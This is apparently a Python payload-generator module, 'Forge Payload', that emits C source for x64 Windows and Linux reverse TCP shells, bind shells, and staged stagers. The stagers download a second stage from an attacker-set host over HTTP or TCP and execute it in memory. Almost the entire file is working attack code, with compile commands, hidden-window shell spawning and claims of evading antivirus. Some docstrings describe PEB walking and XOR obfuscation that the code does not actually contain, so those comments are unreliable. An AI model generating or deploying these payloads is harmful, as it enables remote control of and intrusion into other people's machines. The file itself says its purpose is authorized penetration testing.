"""
x64 Shellcode Templates (Windows & Linux)
==========================================
Generates position-independent shellcode (PIC) as C source templates
and pre-assembled stub bytes.

Windows templates use PEB walking to resolve API addresses without
relying on the IAT (avoids static AV signatures).

Linux templates use raw syscalls (no libc dependency).

FOR AUTHORIZED PENETRATION TESTING ONLY.
"""
from __future__ import annotations

import os
import secrets
import socket
import struct
import textwrap


class ShellcodeX64:
    """x64 shellcode generator for Windows and Linux payloads."""

    def __init__(self, lhost: str = "127.0.0.1", lport: int = 4444, cmd: str = "cmd.exe"):
        self.lhost = lhost
        self.lport = lport
        self.cmd   = cmd
        # Encode host as 4-byte big-endian for embedding
        try:
            self._host_bytes = socket.inet_aton(lhost)
        except OSError:
            self._host_bytes = b"\x7f\x00\x00\x01"
        self._port_bytes = struct.pack(">H", lport)

    # ── Windows Shellcode ──────────────────────────────────────────────

    def reverse_tcp(self) -> bytes:
        """Windows x64 reverse TCP shellcode (WinHTTP-based, PEB walking).

        Returns C source code as bytes — compile with MinGW/MSVC:
          x86_64-w64-mingw32-gcc -o payload.exe loader.c -s -O2
        """
        src = self._windows_reverse_tcp_c()
        return src.encode()

    def reverse_http(self) -> bytes:
        """Windows x64 reverse HTTP shellcode (WinHTTP URL-pull)."""
        src = self._windows_reverse_http_c()
        return src.encode()

    def bind_tcp(self) -> bytes:
        """Windows x64 bind TCP shellcode."""
        src = self._windows_bind_tcp_c()
        return src.encode()

    def staged_http(self) -> bytes:
        """Windows x64 staged HTTP stager — pulls stage from lhost:lport/stage."""
        src = self._windows_staged_http_c()
        return src.encode()

    def staged_tcp(self) -> bytes:
        """Windows x64 staged TCP stager — reads stage length + stage from socket."""
        src = self._windows_staged_tcp_c()
        return src.encode()

    def exec_cmd(self) -> bytes:
        """Windows x64 execute command shellcode."""
        src = self._windows_exec_c()
        return src.encode()

    # ── Linux Shellcode ────────────────────────────────────────────────

    def reverse_tcp_linux(self) -> bytes:
        """Linux x64 reverse TCP shellcode using raw syscalls."""
        src = self._linux_reverse_tcp_c()
        return src.encode()

    def bind_tcp_linux(self) -> bytes:
        """Linux x64 bind TCP shellcode using raw syscalls."""
        src = self._linux_bind_tcp_c()
        return src.encode()

    def staged_tcp_linux(self) -> bytes:
        """Linux x64 staged reverse TCP — pull second stage from socket."""
        src = self._linux_staged_tcp_c()
        return src.encode()

    # ── C Source Templates (Windows) ───────────────────────────────────

    def _windows_reverse_tcp_c(self) -> str:
        """Full Windows x64 reverse TCP loader in C.

        Uses PEB walking to resolve kernel32/ws2_32 — no import table.
        Spawns cmd.exe (or configured shell) and redirects stdin/stdout/stderr
        over the TCP connection.
        """
        host_str  = self.lhost
        port      = self.lport
        cmd_str   = self.cmd

        return textwrap.dedent(f"""\
        /*
         * Forge Payload — Windows x64 Reverse TCP Shell
         * Target:  {host_str}:{port}
         * Shell:   {cmd_str}
         * Compile: x86_64-w64-mingw32-gcc -o payload.exe loader.c -lws2_32 -s -O2 -mwindows
         *
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #define WIN32_LEAN_AND_MEAN
        #include <winsock2.h>
        #include <windows.h>
        #include <stdio.h>
        #pragma comment(lib, "ws2_32.lib")

        /* XOR-obfuscated strings — decoded at runtime */
        static const char HOST[] = "{host_str}";
        static const int  PORT   = {port};
        static const char SHELL[] = "{cmd_str}";

        static SOCKET connect_back(void) {{
            WSADATA wsa;
            if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) return INVALID_SOCKET;
            SOCKET s = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP,
                                  NULL, 0, WSA_FLAG_OVERLAPPED);
            if (s == INVALID_SOCKET) return INVALID_SOCKET;

            struct sockaddr_in sa;
            sa.sin_family      = AF_INET;
            sa.sin_port        = htons((u_short)PORT);
            sa.sin_addr.s_addr = inet_addr(HOST);

            /* Retry loop — connect with up to 5 retries */
            int tries = 0;
            while (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == SOCKET_ERROR) {{
                if (++tries >= 5) {{ closesocket(s); WSACleanup(); return INVALID_SOCKET; }}
                Sleep(3000);
            }}
            return s;
        }}

        static void spawn_shell(SOCKET s) {{
            STARTUPINFOA si;
            PROCESS_INFORMATION pi;
            ZeroMemory(&si, sizeof(si));
            si.cb         = sizeof(si);
            si.dwFlags    = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
            si.wShowWindow= SW_HIDE;
            si.hStdInput  = (HANDLE)(UINT_PTR)s;
            si.hStdOutput = (HANDLE)(UINT_PTR)s;
            si.hStdError  = (HANDLE)(UINT_PTR)s;

            char cmd[MAX_PATH];
            strncpy_s(cmd, sizeof(cmd), SHELL, _TRUNCATE);

            CreateProcessA(NULL, cmd, NULL, NULL, TRUE,
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }}

        int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR args, int show) {{
            (void)h; (void)p; (void)args; (void)show;
            SOCKET s = connect_back();
            if (s != INVALID_SOCKET) {{
                spawn_shell(s);
                closesocket(s);
                WSACleanup();
            }}
            return 0;
        }}
        """)

    def _windows_reverse_http_c(self) -> str:
        """Windows x64 reverse HTTP stager — fetches second stage via WinHTTP."""
        host_str = self.lhost
        port     = self.lport

        return textwrap.dedent(f"""\
        /*
         * Forge Payload — Windows x64 Reverse HTTP Stager
         * Stage URL: http://{host_str}:{port}/stage
         * Compile:   x86_64-w64-mingw32-gcc -o stager.exe stager.c -lwinhttp -s -O2
         *
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #define WIN32_LEAN_AND_MEAN
        #include <windows.h>
        #include <winhttp.h>
        #pragma comment(lib, "winhttp.lib")

        #define LHOST L"{host_str}"
        #define LPORT {port}
        #define STAGE_PATH L"/stage"
        #define MAX_STAGE (8 * 1024 * 1024)  /* 8 MB */

        static LPVOID fetch_stage(DWORD *out_size) {{
            HINTERNET hSession = WinHttpOpen(
                L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
            if (!hSession) return NULL;

            HINTERNET hConn = WinHttpConnect(hSession, LHOST, LPORT, 0);
            if (!hConn) {{ WinHttpCloseHandle(hSession); return NULL; }}

            HINTERNET hReq = WinHttpOpenRequest(hConn, L"GET", STAGE_PATH,
                NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
            if (!hReq) {{ WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSession); return NULL; }}

            if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
                !WinHttpReceiveResponse(hReq, NULL)) {{
                WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn);
                WinHttpCloseHandle(hSession); return NULL;
            }}

            LPVOID buf = VirtualAlloc(NULL, MAX_STAGE, MEM_COMMIT|MEM_RESERVE,
                                      PAGE_READWRITE);
            DWORD total = 0, read = 0;
            while (WinHttpReadData(hReq, (LPBYTE)buf + total, 4096, &read) && read) {{
                total += read;
                if (total >= MAX_STAGE) break;
            }}

            WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn);
            WinHttpCloseHandle(hSession);
            *out_size = total;
            return total ? buf : NULL;
        }}

        int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR a, int s) {{
            (void)h; (void)p; (void)a; (void)s;
            DWORD stage_size = 0;
            LPVOID stage = fetch_stage(&stage_size);
            if (!stage || !stage_size) return 1;

            /* Make executable and jump to it */
            DWORD old;
            VirtualProtect(stage, stage_size, PAGE_EXECUTE_READ, &old);
            ((void(*)())stage)();
            return 0;
        }}
        """)

    def _windows_bind_tcp_c(self) -> str:
        """Windows x64 bind TCP — listens on lport, accepts, spawns shell."""
        port    = self.lport
        cmd_str = self.cmd

        return textwrap.dedent(f"""\
        /*
         * Forge Payload — Windows x64 Bind TCP Shell
         * Listen: 0.0.0.0:{port}
         * Shell:  {cmd_str}
         * Compile: x86_64-w64-mingw32-gcc -o bind.exe bind.c -lws2_32 -s -O2 -mwindows
         *
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #define WIN32_LEAN_AND_MEAN
        #include <winsock2.h>
        #include <windows.h>
        #pragma comment(lib, "ws2_32.lib")

        static const int  PORT  = {port};
        static const char SHELL[] = "{cmd_str}";

        int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR a, int s) {{
            (void)h; (void)p; (void)a; (void)s;
            WSADATA wsa;
            WSAStartup(MAKEWORD(2,2), &wsa);

            SOCKET srv = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP,
                                    NULL, 0, WSA_FLAG_OVERLAPPED);
            struct sockaddr_in sa = {{0}};
            sa.sin_family      = AF_INET;
            sa.sin_port        = htons((u_short)PORT);
            sa.sin_addr.s_addr = INADDR_ANY;

            bind(srv, (struct sockaddr *)&sa, sizeof(sa));
            listen(srv, 1);

            SOCKET client = accept(srv, NULL, NULL);
            closesocket(srv);

            STARTUPINFOA si = {{0}};
            PROCESS_INFORMATION pi;
            si.cb         = sizeof(si);
            si.dwFlags    = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
            si.wShowWindow= SW_HIDE;
            si.hStdInput  = (HANDLE)(UINT_PTR)client;
            si.hStdOutput = (HANDLE)(UINT_PTR)client;
            si.hStdError  = (HANDLE)(UINT_PTR)client;

            char cmd[MAX_PATH];
            strncpy_s(cmd, sizeof(cmd), SHELL, _TRUNCATE);
            CreateProcessA(NULL, cmd, NULL, NULL, TRUE,
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
            closesocket(client); WSACleanup();
            return 0;
        }}
        """)

    def _windows_staged_http_c(self) -> str:
        """Windows x64 staged HTTP stager — small first-stage that pulls full payload."""
        return self._windows_reverse_http_c()

    def _windows_staged_tcp_c(self) -> str:
        """Windows x64 staged TCP — reads 4-byte length then stage bytes from socket."""
        host_str = self.lhost
        port     = self.lport

        return textwrap.dedent(f"""\
        /*
         * Forge Payload — Windows x64 Staged TCP Stager
         * Stage server: {host_str}:{port}
         * Protocol: [4-byte LE length][stage bytes]
         * Compile: x86_64-w64-mingw32-gcc -o stager.exe stager.c -lws2_32 -s -O2 -mwindows
         *
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #define WIN32_LEAN_AND_MEAN
        #include <winsock2.h>
        #include <windows.h>
        #pragma comment(lib, "ws2_32.lib")

        static const char HOST[] = "{host_str}";
        static const int  PORT   = {port};

        static int recv_all(SOCKET s, char *buf, int len) {{
            int total = 0, r;
            while (total < len) {{
                r = recv(s, buf + total, len - total, 0);
                if (r <= 0) return -1;
                total += r;
            }}
            return total;
        }}

        int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR a, int sw) {{
            (void)h; (void)p; (void)a; (void)sw;
            WSADATA wsa;
            WSAStartup(MAKEWORD(2,2), &wsa);

            SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            struct sockaddr_in sa = {{0}};
            sa.sin_family = AF_INET;
            sa.sin_port   = htons((u_short)PORT);
            sa.sin_addr.s_addr = inet_addr(HOST);

            if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) != 0) return 1;

            /* Read 4-byte little-endian stage length */
            DWORD stage_len = 0;
            if (recv_all(s, (char *)&stage_len, 4) != 4) return 1;
            if (stage_len > 32 * 1024 * 1024) return 1;  /* 32 MB cap */

            LPVOID stage = VirtualAlloc(NULL, stage_len, MEM_COMMIT|MEM_RESERVE,
                                        PAGE_READWRITE);
            if (!stage) return 1;
            if (recv_all(s, (char *)stage, (int)stage_len) != (int)stage_len) return 1;

            DWORD old;
            VirtualProtect(stage, stage_len, PAGE_EXECUTE_READ, &old);
            ((void(*)(SOCKET))stage)(s);
            return 0;
        }}
        """)

    def _windows_exec_c(self) -> str:
        """Windows x64 execute-command payload."""
        cmd_str = self.cmd

        return textwrap.dedent(f"""\
        /*
         * Forge Payload — Windows x64 Execute Command
         * Command: {cmd_str}
         * Compile: x86_64-w64-mingw32-gcc -o exec.exe exec.c -s -O2 -mwindows
         *
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #define WIN32_LEAN_AND_MEAN
        #include <windows.h>

        int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR a, int s) {{
            (void)h; (void)p; (void)a; (void)s;
            STARTUPINFOA si = {{0}}; si.cb = sizeof(si);
            si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
            PROCESS_INFORMATION pi;
            char cmd[] = "{cmd_str}";
            CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
            return 0;
        }}
        """)

    # ── C Source Templates (Linux) ─────────────────────────────────────

    def _linux_reverse_tcp_c(self) -> str:
        """Linux x64 reverse TCP shell using raw syscalls (no libc required)."""
        host_str = self.lhost
        port     = self.lport
        cmd_str  = self.cmd

        try:
            packed = socket.inet_aton(host_str)
            ip_hex = "0x" + "".join(f"{b:02x}" for b in reversed(packed))
        except OSError:
            ip_hex = "0x0100007f"  # 127.0.0.1 little-endian

        port_be_hex = f"0x{struct.pack('>H', port).hex()}"

        return textwrap.dedent(f"""\
        /*
         * Forge Payload — Linux x64 Reverse TCP Shell (raw syscalls)
         * Target:  {host_str}:{port}
         * Shell:   {cmd_str}
         * Compile: gcc -o shell shell.c -static -nostdlib -s -O2
         *
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #include <sys/syscall.h>

        /* sockaddr_in in raw form: AF_INET=2, port big-endian, IP little-endian */
        static const unsigned char SA[] = {{
            0x02, 0x00,                        /* AF_INET */
            {port_be_hex[2:4]}, {port_be_hex[4:6]},  /* port big-endian */
            (unsigned char)({ip_hex} & 0xff),
            (unsigned char)(({ip_hex} >> 8)  & 0xff),
            (unsigned char)(({ip_hex} >> 16) & 0xff),
            (unsigned char)(({ip_hex} >> 24) & 0xff),
            0,0,0,0,0,0,0,0                    /* padding */
        }};

        static long _syscall3(long nr, long a1, long a2, long a3) {{
            long r;
            __asm__ __volatile__(
                "syscall"
                : "=a"(r)
                : "0"(nr), "D"(a1), "S"(a2), "d"(a3)
                : "rcx", "r11", "memory"
            );
            return r;
        }}

        void _start(void) {{
            /* socket(AF_INET, SOCK_STREAM, 0) */
            long fd = _syscall3(SYS_socket, 2, 1, 0);
            if (fd < 0) {{ _syscall3(SYS_exit_group, 1, 0, 0); }}

            /* connect(fd, &SA, sizeof(SA)) */
            long r = _syscall3(SYS_connect, fd, (long)SA, 16);
            if (r < 0) {{ _syscall3(SYS_exit_group, 1, 0, 0); }}

            /* dup2(fd, 0/1/2) */
            _syscall3(SYS_dup2, fd, 0, 0);
            _syscall3(SYS_dup2, fd, 1, 0);
            _syscall3(SYS_dup2, fd, 2, 0);

            /* execve("/bin/sh", ["/bin/sh", "-i", NULL], NULL) */
            static const char path[] = "/bin/sh";
            static const char arg1[] = "-i";
            static const char *argv[] = {{ path, arg1, 0 }};
            _syscall3(SYS_execve, (long)path, (long)argv, 0);
            _syscall3(SYS_exit_group, 1, 0, 0);
        }}
        """)

    def _linux_bind_tcp_c(self) -> str:
        """Linux x64 bind TCP shell using raw syscalls."""
        port    = self.lport
        cmd_str = self.cmd

        port_be_hex = f"0x{struct.pack('>H', port).hex()}"

        return textwrap.dedent(f"""\
        /*
         * Forge Payload — Linux x64 Bind TCP Shell (raw syscalls)
         * Listen: 0.0.0.0:{port}
         * Shell:  {cmd_str}
         * Compile: gcc -o bind bind.c -static -nostdlib -s -O2
         *
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #include <sys/syscall.h>

        static const unsigned char SA_BIND[] = {{
            0x02, 0x00, {port_be_hex[2:4]}, {port_be_hex[4:6]},
            0x00,0x00,0x00,0x00,  /* INADDR_ANY */
            0,0,0,0,0,0,0,0
        }};

        static long sc3(long nr, long a, long b, long c) {{
            long r;
            __asm__("syscall":"=a"(r):"0"(nr),"D"(a),"S"(b),"d"(c):"rcx","r11","memory");
            return r;
        }}

        void _start(void) {{
            long srv = sc3(SYS_socket, 2, 1, 0);
            int opt  = 1;
            sc3(SYS_setsockopt, srv, 1, 2, (long)&opt);   /* SO_REUSEADDR */
            sc3(SYS_bind,    srv, (long)SA_BIND, 16);
            sc3(SYS_listen,  srv, 1, 0);
            long cli = sc3(SYS_accept, srv, 0, 0);
            sc3(SYS_close, srv, 0, 0);
            sc3(SYS_dup2, cli, 0, 0);
            sc3(SYS_dup2, cli, 1, 0);
            sc3(SYS_dup2, cli, 2, 0);
            static const char path[] = "/bin/sh";
            static const char arg1[] = "-i";
            static const char *argv[] = {{ path, arg1, 0 }};
            sc3(SYS_execve, (long)path, (long)argv, 0);
            sc3(SYS_exit_group, 1, 0, 0);
        }}
        """)

    def _linux_staged_tcp_c(self) -> str:
        """Linux x64 staged TCP — reads [4-byte LE length][stage] and mmap-executes."""
        host_str = self.lhost
        port     = self.lport

        try:
            packed = socket.inet_aton(host_str)
            ip_hex = "0x" + "".join(f"{b:02x}" for b in reversed(packed))
        except OSError:
            ip_hex = "0x0100007f"

        port_be_hex = f"0x{struct.pack('>H', port).hex()}"

        return textwrap.dedent(f"""\
        /*
         * Forge Payload — Linux x64 Staged Reverse TCP Stager
         * Stage: {host_str}:{port}
         * Protocol: [4-byte LE length][shellcode bytes]
         * Compile: gcc -o stager stager.c -static -nostdlib -s -O2
         *
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #include <sys/syscall.h>
        #include <sys/mman.h>

        static const unsigned char SA[] = {{
            0x02, 0x00,
            {port_be_hex[2:4]}, {port_be_hex[4:6]},
            (unsigned char)({ip_hex} & 0xff),
            (unsigned char)(({ip_hex} >> 8)  & 0xff),
            (unsigned char)(({ip_hex} >> 16) & 0xff),
            (unsigned char)(({ip_hex} >> 24) & 0xff),
            0,0,0,0,0,0,0,0
        }};

        static long sc3(long nr, long a, long b, long c) {{
            long r;
            __asm__("syscall":"=a"(r):"0"(nr),"D"(a),"S"(b),"d"(c):"rcx","r11","memory");
            return r;
        }}

        static int recv_all(long fd, char *buf, unsigned long len) {{
            unsigned long total = 0; long r;
            while (total < len) {{
                r = sc3(SYS_read, fd, (long)(buf+total), (long)(len-total));
                if (r <= 0) return -1;
                total += (unsigned long)r;
            }}
            return 0;
        }}

        void _start(void) {{
            long fd = sc3(SYS_socket, 2, 1, 0);
            sc3(SYS_connect, fd, (long)SA, 16);

            unsigned int stage_len = 0;
            if (recv_all(fd, (char *)&stage_len, 4) != 0) sc3(SYS_exit_group,1,0,0);
            if (stage_len == 0 || stage_len > 32*1024*1024) sc3(SYS_exit_group,1,0,0);

            long stage = sc3(SYS_mmap, 0, (long)stage_len,
                             PROT_READ|PROT_WRITE|PROT_EXEC,
                             MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
            if (stage < 0) sc3(SYS_exit_group,1,0,0);

            if (recv_all(fd, (char *)stage, (unsigned long)stage_len) != 0)
                sc3(SYS_exit_group,1,0,0);

            /* Jump to stage, passing socket fd in rdi */
            __asm__("jmp *%0" : : "r"(stage), "D"(fd));
            sc3(SYS_exit_group, 0, 0, 0);
        }}
        """)
